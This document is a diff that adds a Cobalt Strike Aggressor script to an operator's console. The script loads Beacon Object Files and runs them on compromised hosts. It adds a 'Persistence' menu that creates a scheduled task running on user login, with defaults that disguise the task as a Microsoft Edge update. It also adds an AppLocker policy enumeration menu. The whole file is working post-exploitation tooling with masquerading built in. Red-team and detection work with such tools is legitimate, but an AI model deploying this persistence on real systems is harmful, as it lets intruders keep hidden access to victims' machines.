@@ -1,0 +1,94 @@
+########################################################## BOF ############################################################
+
+#############
+# adapted from TrustedSec!
+# $1 beacon
+# $2 name of the technique
+#############
+sub readbof {
+	local('$barch $handle $data $args');
+	$barch  = barch($1);
+
+	# read in the right BOF file
+    println(script_resource("$2 $+ / $+ $2 $+ . $+ $barch $+ .obj"));
+	$handle = openf(script_resource("$2 $+ / $+ $2 $+ . $+ $barch $+ .obj"));
+	$data   = readb($handle, -1);
+	closef($handle);
+	return $data;
+}
+
+########################################################## schtask ############################################################
+
+
+sub schtask_callback {
+    local('$task_name $task_author $task_description $payload_path $parameters')
+	$bid = $3['bid'];
+    $task_name = $3['task_name'];
+	$task_author = $3['task_author'];
+	$task_description = $3['task_description'];
+	$payload_path = $3['payload_path'];
+	$parameters = $3['parameters'];
+
+
+	if($payload_path eq ""){
+		show_message("the payload path cannot be empty! Exiting...");
+		return;
+	}
+
+	$args = bof_pack($bid, "ZZZZZ", $task_name, $task_author, $task_description, $payload_path, $parameters);
+
+	btask($bid, "Tasked beacon to run scheduled tasks with arguments: \n" .
+	"\c2[*] task name: " . $task_name . "\n" .
+	"\c2[*] task author: " . $task_author . "\n" .
+	"\c2[*] task description: " . $task_description . "\n" .
+	"\c2[*] payload_path: " . $payload_path . "\n" .
+	"\c2[*] parameters: " . $parameters
+	);
+	beacon_inline_execute($bid, readbof($bid, "scheduled-tasks"), "go", $args);
+}
+
+
+sub dialog_scheduled_tasks{
+	local('$dialog');
+
+	$dialog = dialog("scheduled tasks", 
+	%(bid => $1, task_name => "MicrosoftEdgeUpdateMachineUIA", task_author => "Microsoft Corperation", task_description  => "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be up to date.", payload_path => "C:\\windows\\system32\\cmd.exe", parameters => "/c notepad.exe"), &schtask_callback);
+	dialog_description($dialog, "Basic persistence with scheduled tasks, command will run on the current user login");
+	drow_text($dialog, "task_name",  "Task name: ");
+	drow_text($dialog, "task_author", "Task author: ");
+	drow_text($dialog, "task_description", "Task description:" );
+	drow_text($dialog, "payload_path", "Payload path: ");
+	drow_text($dialog, "parameters", "Payload parameters: ");
+	dbutton_action($dialog, "Launch");
+	dialog_show($dialog);	
+}
+
+
+
+########################################################## applocker ###########################################################
+
+sub applocker_enum {
+	beacon_inline_execute($1, readbof($1, "applocker-enumerator"), "go", $args);
+}
+
+
+########################################################## GUI #############################################################
+popup beacon_bottom {
+	menu "Persistence" {
+		item "Scheduled Tasks"{
+		local('$bid');
+		foreach $bid ($1) {
+			dialog_scheduled_tasks($bid);
+		} # forearch
+		} # schtask
+	} #Persistence menu
+
+	menu "Enumeration" {
+		item "Applocker Policy" {
+			local('$bid');
+			foreach $bid ($1) {
+			applocker_enum($bid);
+		} # forearch
+		}
+	}
+}
